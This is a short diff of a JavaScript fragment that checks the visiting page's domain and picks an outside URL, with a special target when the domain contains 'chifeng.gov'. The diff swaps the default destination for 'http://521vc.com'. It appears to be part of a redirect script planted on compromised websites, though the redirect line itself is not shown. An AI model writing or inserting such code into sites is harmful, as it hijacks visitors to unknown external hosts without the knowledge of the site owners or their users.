@@ -1,6 +1,6 @@
 var js616dm = document.domain.toLowerCase(); 
 
-var this_url = 'http://889i.oss.aliyuncs.com/999.htm';
+var this_url = 'http://521vc.com';
 if(js616dm.indexOf('chifeng.gov')!=-1){
   this_url = 'http://www.123188.com/';
 }
